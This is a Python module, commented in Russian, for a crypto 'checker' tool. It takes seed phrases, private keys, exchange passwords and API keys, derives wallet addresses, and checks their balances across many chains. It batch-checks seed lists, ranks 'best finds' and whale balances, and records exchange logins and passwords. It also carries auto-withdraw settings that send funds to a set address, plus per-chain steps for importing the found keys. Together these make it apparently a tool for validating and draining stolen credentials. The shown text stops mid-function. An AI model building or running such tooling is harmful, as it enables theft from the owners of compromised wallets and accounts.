import asyncio
import aiohttp
import re
import hashlib
import hmac
import struct
import time
import os

from checkers.base_checker import BaseChecker
from checkers.balance_formatter import BalanceFormatter  # v1.0.57: Улучшенное отображение балансов
from checkers.crypto_extensions import (
    get_all_erc20_tokens,
    get_nfts,
    export_to_excel
)
from checkers.defi_checker import check_all_defi_positions
from checkers.multichain_checker import (
    check_multichain_balance,
    get_optimal_gas_price,
    monitor_gas_prices,
    find_best_gas_time,
    EVM_CHAINS
)
from checkers.advanced_withdraw import (
    BatchWithdrawManager,
    FlashbotsManager,
    ScheduledWithdrawManager,
    ConditionalWithdrawManager,
    BridgeManager
)
# v1.0.77: Оптимизация производительности
from checkers.performance_optimizer import (
    global_cache,
    global_rate_limiter,
    global_monitor,
    cached,
    rate_limited,
    timed
)
# v1.0.85: Exchange API checker
from checkers.exchange_checker import detect_api_format, check_exchange_api, global_exchange_exporter
# v1.0.87: API utils — retry, реальный airdrop, расширенные SPL токены, валидация Solana
from checkers.api_utils import (
    fetch_with_retry,
    check_airdrop_eligibility,
    fetch_spl_tokens_extended,
    is_valid_solana_address,
)
# v1.0.88: Новые модули
from checkers.ton_checker import check_ton_full
from checkers.evm_multichain import check_evm_all_chains, format_multichain_message
from checkers.balance_cache import global_balance_cache
# v1.0.89: Новые модули
from checkers.sol_staking import check_sol_staking, format_staking_message
from checkers.wallet_exporter import global_wallet_exporter

_WALLET_PATTERNS = [
    ("bitcoin",   re.compile(r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$')),
    ("ethereum",  re.compile(r'^0x[a-fA-F0-9]{40}$')),
    ("tron",      re.compile(r'^T[a-zA-HJ-NP-Z0-9]{33}$')),
    ("solana",    re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')),
    ("ton",       re.compile(r'^(EQ|UQ)[a-zA-Z0-9_-]{46}$')),
    ("cardano",   re.compile(r'^addr1[a-z0-9]{50,100}$')),
    ("litecoin",  re.compile(r'^(L|M|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,62}$')),
    ("dash",      re.compile(r'^X[1-9A-HJ-NP-Za-km-z]{24,33}$')),
    ("monero",    re.compile(r'^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$')),
    ("ripple",    re.compile(r'^r[1-9A-HJ-NP-Za-km-z]{24,34}$')),
    ("dogecoin",  re.compile(r'^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$')),
    ("bnb",       re.compile(r'^bnb1[a-z0-9]{38}$')),
]

_PRIVKEY_HEX_RE  = re.compile(r'^(0x)?[a-fA-F0-9]{64}$')
_PRIVKEY_WIF_RE  = re.compile(r'^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$')
_SEED_RE = re.compile(r'^([a-z]+\s){11,23}[a-z]+$', re.IGNORECASE)

_WALLET_FIRST_CHARS = frozenset('bB013456789LMlTXrDdEUa')

_EXCHANGE_API_RE = re.compile(r'^[a-zA-Z0-9]{32,64}:[a-zA-Z0-9]{32,64}$')
_EXCHANGE_KEYWORDS = ["binance", "bybit", "okx", "huobi", "kucoin", "gate", "mexc", "bitget"]

_TOKEN_COINGECKO_MAP = {
    "USDT": "tether", "USDC": "usd-coin", "DAI": "dai", "LINK": "chainlink",
    "UNI": "uniswap", "SHIB": "shiba-inu", "PEPE": "pepe", "WETH": "weth",
}

_PRICE_CACHE: dict = {}
_PRICE_CACHE_TS: float = 0.0
_PRICE_TTL = 300

_ERC20_TOKENS = {
    "USDT":  ("0xdac17f958d2ee523a2206206994597c13d831ec7", 6),
    "USDC":  ("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", 6),
    "WETH":  ("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", 18),
    "DAI":   ("0x6b175474e89094c44da98b954eedeac495271d0f", 18),
    "SHIB":  ("0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce", 18),
    "LINK":  ("0x514910771af9ca656af840dff83e8264ecf986ca", 18),
    "UNI":   ("0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", 18),
    "PEPE":  ("0x6982508145454ce325ddbe47a25d4ec3d2311933", 18),
}

_EVM_CHAINS = [
    ("ethereum",  "https://cloudflare-eth.com",                    "ETH"),
    ("bsc",       "https://bsc-dataseed.binance.org/",             "BNB"),
    ("polygon",   "https://polygon-rpc.com",                       "MATIC"),
    ("avalanche", "https://api.avax.network/ext/bc/C/rpc",         "AVAX"),
    ("base",      "https://mainnet.base.org",                      "ETH"),
    ("arbitrum",  "https://arb1.arbitrum.io/rpc",                  "ETH"),
    ("optimism",  "https://mainnet.optimism.io",                   "ETH"),
    # Новые сети v1.0.53
    ("fantom",    "https://rpcapi.fantom.network",                         "FTM"),
    ("cronos",    "https://evm.cronos.org",                        "CRO"),
    ("zksync",    "https://mainnet.era.zksync.io",                 "ETH"),
    ("linea",     "https://rpc.linea.build",                       "ETH"),
    ("scroll",    "https://rpc.scroll.io",                         "ETH"),
]

_DEX_ROUTERS = {
    "Uniswap V2": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
    "Uniswap V3": "0xE592427A0AEce92De3Edee1F18E0157C05861564",
    "1inch":      "0x1111111254EEB25477B68fb85Ed929f73A960582",
}

_USDT_CONTRACT = "0xdac17f958d2ee523a2206206994597c13d831ec7"

# ═══════════════════════════════════════════════════════════════════════════
#  НАСТРОЙКИ АВТОВЫВОДА
# ═══════════════════════════════════════════════════════════════════════════
_AUTO_WITHDRAW_ENABLED = False  # Включить/выключить автовывод
_AUTO_WITHDRAW_ADDRESSES = {
    "ethereum": "",  # Адрес для вывода ETH и ERC-20 токенов
    "bsc": "",       # Адрес для вывода BNB и BEP-20 токенов
    "bitcoin": "",   # Адрес для вывода BTC
    "tron": "",      # Адрес для вывода TRX и TRC-20 токенов
    "solana": "",    # Адрес для вывода SOL
}
_AUTO_WITHDRAW_MIN_AMOUNT = {
    "ethereum": 0.01,  # Минимум 0.01 ETH для вывода
    "bsc": 0.01,       # Минимум 0.01 BNB
    "bitcoin": 0.001,  # Минимум 0.001 BTC
    "tron": 10,        # Минимум 10 TRX
    "solana": 0.1,     # Минимум 0.1 SOL
}
_AUTO_WITHDRAW_LEAVE_GAS = True  # Оставлять немного на газ
_AUTO_WITHDRAW_LOG = []  # Лог всех выводов


class CryptoChecker(BaseChecker):
    def __init__(self):
        self.wallet_patterns = _WALLET_PATTERNS
        self.exchanges = ["binance","bybit","okx","huobi","kucoin","gate","mexc","bitget"]
        self.auto_withdraw_enabled = _AUTO_WITHDRAW_ENABLED
        self.withdraw_addresses = _AUTO_WITHDRAW_ADDRESSES.copy()
        self.withdraw_min_amounts = _AUTO_WITHDRAW_MIN_AMOUNT.copy()
        
        # Автообмен токенов
        self.auto_swap_enabled = False
        self.swap_target_token = "ETH"
        self.swap_min_value_usd = 1.0
        self.swap_slippage = 1.0
        self.swap_dex = "uniswap"
        
        # Статистика сессии
        self.session_stats = {
            "total_checked": 0,
            "total_valid": 0,
            "total_with_balance": 0,
            "total_usd": 0.0,
            "total_withdrawn": 0,
            "total_swapped": 0,
            "best_find": {"address": "", "amount": 0.0, "chain": ""},
            "by_chain": {},
            "by_type": {},
            "start_time": None,
            "end_time": None,
        }
        
        # v1.0.54: Новые менеджеры для улучшенного автовывода
        self.batch_manager = BatchWithdrawManager()
        self.flashbots_manager = FlashbotsManager()
        self.scheduled_manager = ScheduledWithdrawManager()
        self.conditional_manager = ConditionalWithdrawManager()
        self.bridge_manager = BridgeManager()
        
        # Настройки мультичейн проверки
        self.multichain_enabled = False  # Включить одновременную проверку всех сетей
        self.gas_optimization_enabled = True  # EIP-1559 оптимизация
        self.flashbots_enabled = False  # MEV защита
        self.batch_enabled = False  # Batch транзакции
        
        self.auth_info = {
            "bitcoin":   {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Electrum, Exodus, Trust Wallet","how":"Скачай кошелек Electrum, нажми 'Создать/Восстановить кошелек', выбери импорт приватного ключа или BIP-39 сид-фразы."},
            "ethereum":  {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Trust Wallet, Rabby","how":"Установи расширение MetaMask, зайди в Мои счета -> 'Импортировать счет' и вставь приватный ключ (0x...)."},
            "polygon":   {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Trust Wallet","how":"Импортируй приватный ключ в MetaMask и переключи сеть на сеть Polygon RPC."},
            "base":      {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Coinbase Wallet","how":"Импортируй приватный ключ в MetaMask и переключи сеть на сеть Base Mainnet."},
            "solana":    {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Phantom, Solflare","how":"Установи расширение Phantom (phantom.app), выбери 'Импортировать секретный приватный ключ' и вставь строку."},
            "ton":       {"auth_type":"Сид-фраза (24 слова)","wallets":"Tonkeeper, MyTonWallet","how":"Установи приложение Tonkeeper, нажми 'Восстановить кошелек' и введи 24 слова сид-фразы по порядку."},
            "cardano":   {"auth_type":"Сид-фраза (15/24 слов)","wallets":"Yoroi, Eternl","how":"Установи кошелек Yoroi, выбери 'Восстановить кошелек (Cardano)' и введи слова фразы."},
            "tron":      {"auth_type":"Приватный ключ","wallets":"TronLink, Trust Wallet","how":"Установи расширение TronLink, нажми 'Импорт кошелька' -> 'Приватный ключ' и вставь строку ключа."},
            "litecoin":  {"auth_type":"Приватный ключ","wallets":"Electrum-LTC, Trust Wallet","how":"Установи клиент Electrum-LTC, выбери импорт ключей и введи приватный адрес."},
            "dash":      {"auth_type":"Приватный ключ","wallets":"Dash Core, Exodus","how":"В кошельке Dash Core открой консоль и введи команду: importprivkey <твой_ключ>."},
            "monero":    {"auth_type":"Сид-фраза (25 слов)","wallets":"Monero GUI, Cake Wallet","how":"В Monero GUI выбери 'Восстановить кошелек из мнемонической фразы' и введи 25 слов."},
            "ripple":    {"auth_type":"Приватный ключ / Family Seed","wallets":"XUMM (Xaman), Trust Wallet","how":"Скачай приложение XUMM, выбери импорт аккаунта и введи Family Seed (секретную строку)."},
            "dogecoin":  {"auth_type":"Приватный ключ","wallets":"Dogecoin Core, Exodus","how":"В клиенте кошелька импортируй текстовый приватный ключ для мгновенного доступа к балансу."},
            "bnb":       {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Trust Wallet, MetaMask","how":"Импортируй ключ в MetaMask и подключи сеть Binance Smart Chain (BSC)."},
        }

    # Входная точка запуска проверки, которая случайно пропала
    async def check(self, data: str, timeout: int = 10, proxy: str = None,
                    session: aiohttp.ClientSession = None) -> dict:
        result = self.make_result(input=data, type="unknown")
        own_session = session is None
        if own_session:
            session = aiohttp.ClientSession()
        try:
            # Безопасная очистка данных
            cleaned_data = data.strip() if data else ""
            
            # Проверка на пустые данные
            if not cleaned_data:
                result["info"]["error"] = "Empty input"
                return result
            
            # Проверка на слишком длинные данные (защита от переполнения)
            if len(cleaned_data) > 10000:
                result["info"]["error"] = "Input too long (max 10000 characters)"
                return result
            
            result = await self._dispatch(cleaned_data, timeout, proxy, session)

            # Обновляем статистику сессии
            self._update_session_stats(result)

            # v1.0.89: Автоматически сохраняем в экспортер если есть баланс
            if result.get("exists"):
                global_wallet_exporter.add_result(result)
            
        except UnicodeDecodeError as e:
            result["info"]["error"] = f"Encoding error: {str(e)}"
        except ValueError as e:
            result["info"]["error"] = f"Invalid value: {str(e)}"
        except Exception as e:
            result["info"]["error"] = f"Error: {str(e)}"
            # Логируем для отладки
            import traceback
            print(f"❌ Error processing '{data[:50]}...': {e}")
            print(traceback.format_exc())
        finally:
            if own_session:
                await session.close()
        return result
    
    def _update_session_stats(self, result: dict):
        """Обновить статистику сессии после проверки"""
        
        # Инициализируем start_time если это первая проверка
        if self.session_stats["start_time"] is None:
            self.session_stats["start_time"] = time.time()
        
        # Увеличиваем счетчик проверенных
        self.session_stats["total_checked"] += 1
        
        # Проверяем валидность
        if result.get("exists") or not result.get("info", {}).get("error"):
            self.session_stats["total_valid"] += 1
        
        # Получаем баланс
        info = result.get("info", {})
        balance_usd = 0.0
        
        # Пытаемся получить баланс из разных полей
        if "total_usd" in info:
            balance_usd = float(info.get("total_usd", 0))
        elif "balance_usd" in info:
            balance_usd = float(info.get("balance_usd", 0))
        elif "balance" in info:
            # Если есть balance но нет USD, пытаемся конвертировать
            balance = float(info.get("balance", 0))
            wallet_type = result.get("wallet_type", "")
            
            # Примерные цены для конвертации
            price_map = {
                "bitcoin": 45000,
                "ethereum": 2500,
                "bnb": 300,
                "solana": 100,
                "polygon": 0.8,
                "tron": 0.1,
            }
            
            price = price_map.get(wallet_type, 0)
            if price > 0:
                balance_usd = balance * price
        
        # Если есть баланс
        if balance_usd > 0:
            self.session_stats["total_with_balance"] += 1
            self.session_stats["total_usd"] += balance_usd
            
            # Обновляем лучшую находку
            if balance_usd > self.session_stats["best_find"]["amount"]:
                self.session_stats["best_find"] = {
                    "address": result.get("input", "")[:50],
                    "amount": balance_usd,
                    "chain": result.get("wallet_type", result.get("type", "unknown"))
                }
        
        # Статистика по сетям
        chain = result.get("wallet_type") or result.get("type") or "unknown"
        if chain not in self.session_stats["by_chain"]:
            self.session_stats["by_chain"][chain] = {
                "count": 0,
                "total_usd": 0.0
            }
        
        self.session_stats["by_chain"][chain]["count"] += 1
        self.session_stats["by_chain"][chain]["total_usd"] += balance_usd

    async def batch_check_seeds(self, seed_list: list, timeout: int = 10, proxy: str = None) -> dict:
        """
        4. BATCH ПРОВЕРКА СИД-ФРАЗ
        Проверяет список сид-фраз одновременно и возвращает общую статистику
        """
        result = {
            "total_seeds": len(seed_list),
            "valid_seeds": 0,
            "invalid_seeds": 0,
            "seeds_with_balance": 0,
            "total_usd": 0.0,
            "results": [],
            "summary": {},
        }
        
        async with aiohttp.ClientSession() as session:
            tasks = [self._check_seed(seed.strip(), timeout, proxy, session) for seed in seed_list]
            check_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for seed, res in zip(seed_list, check_results):
                if isinstance(res, Exception):
                    result["invalid_seeds"] += 1
                    result["results"].append({
                        "seed": seed[:20] + "...",
                        "error": str(res),
                        "exists": False,
                    })
                    continue
                
                if res.get("info", {}).get("error"):
                    result["invalid_seeds"] += 1
                else:
                    result["valid_seeds"] += 1
                
                if res.get("exists"):
                    result["seeds_with_balance"] += 1
                    result["total_usd"] += res.get("info", {}).get("total_usd", 0)
                
                result["results"].append({
                    "seed": seed[:20] + "...",
                    "exists": res.get("exists", False),
                    "total_usd": res.get("info", {}).get("total_usd", 0),
                    "addresses_checked": res.get("info", {}).get("total_addresses_checked", 0),
                    "addresses_with_balance": res.get("info", {}).get("addresses_with_balance", 0),
                    "message": res.get("info", {}).get("message", ""),
                })
        
        result["summary"] = {
            "success_rate": f"{(result['valid_seeds'] / result['total_seeds'] * 100):.1f}%" if result['total_seeds'] > 0 else "0%",
            "balance_rate": f"{(result['seeds_with_balance'] / result['total_seeds'] * 100):.1f}%" if result['total_seeds'] > 0 else "0%",
            "total_value": f"${result['total_usd']:,.2f}",
        }
        
        return result

    def _whale_label(self, total_usd):
        if total_usd >= 10000:
            return f" | \U0001f40b КИТ (Whale Alert)"
        elif total_usd >= 1000:
            return f" | \U0001f4b0 Высокий баланс"
        return ""

    async def _get_prices(self, session, timeout):
        global _PRICE_CACHE, _PRICE_CACHE_TS
        if _PRICE_CACHE and (time.time() - _PRICE_CACHE_TS) < _PRICE_TTL:
            return _PRICE_CACHE
        # v1.0.92: + fantom (раньше отсутствовал → Fantom USD всегда был $0), cronos, mantle, xdai, celo, moonbeam
        ids = "bitcoin,ethereum,tron,solana,litecoin,dash,monero,ripple,dogecoin,binancecoin,the-open-network,cardano,matic-network,avalanche-2,fantom,crypto-com-chain,mantle,xdai,celo,moonbeam"
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd&include_24hr_change=true"
        try:
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=None)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                _PRICE_CACHE = {
                    "bitcoin":   {"price": d.get("bitcoin",{}).get("usd",0), "change": d.get("bitcoin",{}).get("usd_24h_change",0)},
                    "ethereum":  {"price": d.get("ethereum",{}).get("usd",0), "change": d.get("ethereum",{}).get("usd_24h_change",0)},
                    "tron":      {"price": d.get("tron",{}).get("usd",0), "change": d.get("tron",{}).get("usd_24h_change",0)},
                    "solana":    {"price": d.get("solana",{}).get("usd",0), "change": d.get("solana",{}).get("usd_24h_change",0)},
                    "litecoin":  {"price": d.get("litecoin",{}).get("usd",0), "change": d.get("litecoin",{}).get("usd_24h_change",0)},
                    "dash":      {"price": d.get("dash",{}).get("usd",0), "change": d.get("dash",{}).get("usd_24h_change",0)},
                    "monero":    {"price": d.get("monero",{}).get("usd",0), "change": d.get("monero",{}).get("usd_24h_change",0)},
                    "ripple":    {"price": d.get("ripple",{}).get("usd",0), "change": d.get("ripple",{}).get("usd_24h_change",0)},
                    "dogecoin":  {"price": d.get("dogecoin",{}).get("usd",0), "change": d.get("dogecoin",{}).get("usd_24h_change",0)},
                    "bnb":       {"price": d.get("binancecoin",{}).get("usd",0), "change": d.get("binancecoin",{}).get("usd_24h_change",0)},
                    "ton":       {"price": d.get("the-open-network",{}).get("usd",0), "change": d.get("the-open-network",{}).get("usd_24h_change",0)},
                    "cardano":   {"price": d.get("cardano",{}).get("usd",0), "change": d.get("cardano",{}).get("usd_24h_change",0)},
                    "polygon":   {"price": d.get("matic-network",{}).get("usd",0), "change": d.get("matic-network",{}).get("usd_24h_change",0)},
                    "avalanche": {"price": d.get("avalanche-2",{}).get("usd",0), "change": d.get("avalanche-2",{}).get("usd_24h_change",0)},
                    "base":      {"price": d.get("ethereum",{}).get("usd",0), "change": d.get("ethereum",{}).get("usd_24h_change",0)},
                    # v1.0.92: новые сети
                    "fantom":    {"price": d.get("fantom",{}).get("usd",0), "change": d.get("fantom",{}).get("usd_24h_change",0)},
                    "cronos":    {"price": d.get("crypto-com-chain",{}).get("usd",0), "change": d.get("crypto-com-chain",{}).get("usd_24h_change",0)},
                    "mantle":    {"price": d.get("mantle",{}).get("usd",0), "change": d.get("mantle",{}).get("usd_24h_change",0)},
                    "xdai":      {"price": d.get("xdai",{}).get("usd",0), "change": d.get("xdai",{}).get("usd_24h_change",0)},
                    "celo":      {"price": d.get("celo",{}).get("usd",0), "change": d.get("celo",{}).get("usd_24h_change",0)},
                    "moonbeam":  {"price": d.get("moonbeam",{}).get("usd",0), "change": d.get("moonbeam",{}).get("usd_24h_change",0)},
                }
                _PRICE_CACHE_TS = time.time()
            else:
                resp.close()
        except Exception:
            pass
        return _PRICE_CACHE

    def _usd(self, amount, coin, prices):
        p_data = prices.get(coin, {})
        if isinstance(p_data, dict):
            p = p_data.get("price", 0)
            change = p_data.get("change", 0)
            if p and amount:
                usd_val = amount * p
                change_str = f" ({change:+.1f}%)" if change else ""
                return f" (~${usd_val:,.2f}{change_str})"
        elif isinstance(p_data, (int, float)):
            # Backward compatibility
            return f" (~${amount*p_data:,.2f})" if p_data and amount else ""
        return ""

    async def _dispatch(self, data, timeout, proxy, session):
        normalized_data = " ".join(data.strip().split())
        words = normalized_data.split()
        if len(words) in (12, 15, 18, 21, 24) and _SEED_RE.match(normalized_data):
            return await self._check_seed(normalized_data, timeout, proxy, session)

        if _PRIVKEY_HEX_RE.match(data):
            return await self._check_privkey_hex(data, timeout, proxy, session)

        if _PRIVKEY_WIF_RE.match(data):
            return await self._check_privkey_wif(data, timeout, proxy, session)

        wallet_type = self._detect_wallet(data)
        if wallet_type:
            result = self.make_result(input=data, type="wallet", wallet_type=wallet_type)
            handler = {
                "bitcoin":  self._check_bitcoin, "ethereum": self._check_ethereum,
                "tron":     self._check_tron, "solana":   self._check_solana,
                "ton":      self._check_ton, "cardano":  self._check_cardano,
                "litecoin": self._check_litecoin, "dash":     self._check_dash,
                "monero":   self._check_monero, "ripple":   self._check_ripple,
                "dogecoin": self._check_dogecoin, "bnb":      self._check_bnb,
            }.get(wallet_type)
            if handler:
                result = await handler(data, timeout, proxy, session)
                if result.get("exists") and wallet_type in self.auth_info:
                    result["info"]["auth"] = self.auth_info[wallet_type]
            else:
                result["info"]["error"] = f"No checker for {wallet_type}"
            return result

        exchange = self._detect_exchange(data)
        if exchange:
            login, password = self._parse_credentials(data)
            
            # ИСПРАВЛЕНО: Проверяем что есть хотя бы login или password
            # Если оба пустые - это просто URL, а не credentials
            if login or password:
                result = self.make_result(input=data, type="exchange")
                result["exchange"] = exchange
                result["platform"] = exchange
                result["exists"] = True
                result["info"].update({
                    "exchange": exchange,
                    "login": login,
                    "password": password,
                    "message": f"Exchange: {exchange} | Login: {login} | Pass: {password}"
                })
                return result
            else:
                # Если credentials не найдены, это просто URL
                # Не обрабатываем как exchange, продолжаем дальше
                pass

        if data.endswith(".eth"):
            resolved = await self._resolve_ens(data, timeout, proxy, session)
            if resolved: return await self._check_ethereum(resolved, timeout, proxy, session)

        if data.endswith((".crypto", ".nft", ".wallet")):
            resolved = await self._resolve_unstoppable(data, timeout, proxy, session)
            if resolved: return await self._check_ethereum(resolved, timeout, proxy, session)

        exchange_api = self._detect_exchange_api(data)
        if exchange_api: return self._make_exchange_api_result(data, exchange_api)

        # v1.0.85: Проверка формата exchange:api_key:api_secret[:passphrase]
        api_fmt = detect_api_format(data)
        if api_fmt:
            exchange, api_key, api_secret, passphrase = api_fmt
            result = await check_exchange_api(
                exchange, api_key, api_secret, passphrase,
                session=session, timeout=timeout
            )
            # Сохраняем в экспортер если валидный
            if result.get("valid"):
                global_exchange_exporter.add(result)
            return result

        result = self.make_result(input=data, type="unknown")
        result["info"]["error"] = "Unknown crypto format"
        return result

    async def _resolve_ens(self, name, timeout, proxy, session):
        try:
            url = f"https://api.ensideas.com/ens/resolve/{name}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                address = d.get("address", "")
                if address and address.startswith("0x") and len(address) == 42: return address
            resp.close()
        except Exception: pass
        return None

    async def _resolve_unstoppable(self, name, timeout, proxy, session):
        try:
            url = f"https://resolve.unstoppabledomains.com/domains/{name}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                address = d.get("records", {}).get("crypto.ETH.address", "")
                if address and address.startswith("0x") and len(address) == 42: return address
            resp.close()
        except Exception: pass
        return None

    def _detect_exchange_api(self, data):
        dl = data.lower()
        detected_exchange = None
        for kw in _EXCHANGE_KEYWORDS:
            if kw in dl: detected_exchange = kw; break
        if not detected_exchange: return None
        parts = re.findall(r'[a-zA-Z0-9]{32,64}', data)
        if len(parts) >= 2: return detected_exchange
        return None

    def _make_exchange_api_result(self, data, exchange):
        result = self.make_result(input=data[:20] + "...", type="exchange_api", exists=True, platform=exchange)
        result["info"].update({"exchange": exchange, "message": f"API KEY pair found for {exchange.upper()}", "total_usd": 0})
        return result

    async def _get_token_prices(self, symbols, session, timeout):
        if not symbols: return {}
        ids = []
        symbol_to_id = {}
        for sym in symbols:
            cg_id = _TOKEN_COINGECKO_MAP.get(sym.upper())
            if cg_id: ids.append(cg_id); symbol_to_id[sym.upper()] = cg_id
        if not ids: return {s.upper(): 1.0 for s in symbols if s.upper() in ("USDT", "USDC", "DAI")}
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={','.join(ids)}&vs_currencies=usd"
        try:
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=None)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                return {sym: d.get(cg_id, {}).get("usd", 0) for sym, cg_id in symbol_to_id.items()}
            resp.close()
        except Exception: pass
        return {s.upper(): 1.0 for s in symbols if s.upper() in ("USDT", "USDC", "DAI")}

    async def _get_activity_score(self, address, timeout, proxy, session):
        import i18n
        try:
            url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&page=1&offset=10&sort=desc"
            k = os.environ.get("ETHERSCAN_API_KEY", "")
            if k: url += f"&apikey={k}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                txs = d.get("result", [])
                if isinstance(txs, list):
                    return i18n.t("activity_active") if len(txs) > 5 else i18n.t("activity_low") if len(txs) >= 1 else i18n.t("activity_dormant")
            resp.close()
        except Exception: pass
        return ""

    async def _check_btc_ordinals(self, address, timeout, proxy, session):
        try:
            url = f"https://ordapi.xyz/address/{address}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                if isinstance(d, list) and len(d) > 0:
                    return f" | [NFT/Ordinals: Найдено {len(d)} шт]"
            resp.close()
        except Exception: pass
        return ""

    async def _check_airdrop_eligibility(self, address, timeout, proxy, session):
        # v1.0.87: Реальная проверка через публичные API
        return await check_airdrop_eligibility(address, timeout, proxy, session)

    async def _check_seed(self, phrase, timeout, proxy, session):
        """
        УЛУЧШЕННАЯ ПРОВЕРКА СИД-ФРАЗЫ:
        1. Расширенная деривация (первые 10 адресов)
        2. Больше монет (BTC, ETH, LTC, DOGE, DASH, BNB, SOL, TRX)
        3. Проверка валидности + checksum
        4. Все форматы BTC (Legacy, SegWit, Native SegWit, Taproot)
        """
        result = self.make_result(input=phrase[:20]+"...", type="seed")
        prices = await self._get_prices(session, timeout)
        
        # Валидация сид-фразы
        words = phrase.strip().split()
        word_count = len(words)
        
        if word_count not in [12, 15, 18, 21, 24]:
            result["info"]["error"] = f"Неверное количество слов: {word_count}. Должно быть 12/15/18/21/24"
            return result
        
        # Определение силы фразы
        strength_map = {12: "128 бит", 15: "160 бит", 18: "192 бит", 21: "224 бит", 24: "256 бит"}
        result["info"]["strength"] = strength_map.get(word_count, "Unknown")
        
        derived = {}
        errors = []
        
        try:
            from bip_utils import (
                Bip39MnemonicValidator, Bip39SeedGenerator, Bip39Languages,
                Bip44, Bip44Coins, Bip44Changes,
                Bip49, Bip49Coins, Bip84, Bip84Coins, Bip86, Bip86Coins
            )
            
            # Проверка валидности (английский и русский)
            is_valid_en = Bip39MnemonicValidator(Bip39Languages.ENGLISH).IsValid(phrase)
            is_valid_ru = Bip39MnemonicValidator(Bip39Languages.RUSSIAN).IsValid(phrase)
            
            if not (is_valid_en or is_valid_ru):
                result["info"]["error"] = "Неверная BIP-39 мнемоника (checksum не совпадает)"
                result["info"]["warning"] = "Возможно опечатка в словах или неверный порядок"
                return result
            
            result["info"]["language"] = "English" if is_valid_en else "Russian"
            result["info"]["checksum"] = "✓ Valid"
            
            seed_bytes = Bip39SeedGenerator(phrase).Generate()
            
            # 1. BITCOIN - все форматы, первые 10 адресов
            for i in range(10):
                try:
                    # Legacy (P2PKH) - m/44'/0'/0'/0/i
                    btc_legacy = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_Legacy_{i}"] = btc_legacy.PublicKey().ToAddress()
                    
                    # SegWit (P2SH-P2WPKH) - m/49'/0'/0'/0/i
                    btc_segwit = Bip49.FromSeed(seed_bytes, Bip49Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_SegWit_{i}"] = btc_segwit.PublicKey().ToAddress()
                    
                    # Native SegWit (Bech32) - m/84'/0'/0'/0/i
                    btc_native = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_Native_{i}"] = btc_native.PublicKey().ToAddress()
                    
                    # Taproot (Bech32m) - m/86'/0'/0'/0/i
                    btc_taproot = Bip86.FromSeed(seed_bytes, Bip86Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_Taproot_{i}"] = btc_taproot.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"BTC_{i}: {e}")
            
            # 2. ETHEREUM - первые 10 адресов (m/44'/60'/0'/0/i)
            for i in range(10):
                try:
                    eth_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"ETH_{i}"] = eth_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"ETH_{i}: {e}")
            
            # 3. LITECOIN - первые 5 адресов (m/44'/2'/0'/0/i)
            for i in range(5):
                try:
                    ltc_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.LITECOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"LTC_{i}"] = ltc_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"LTC_{i}: {e}")
            
            # 4. DOGECOIN - первые 5 адресов (m/44'/3'/0'/0/i)
            for i in range(5):
                try:
                    doge_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.DOGECOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"DOGE_{i}"] = doge_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"DOGE_{i}: {e}")
            
            # 5. DASH - первые 5 адресов (m/44'/5'/0'/0/i)
            for i in range(5):
                try:
                    dash_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.DASH).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"DASH_{i}"] = dash_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"DASH_{i}: {e}")
            
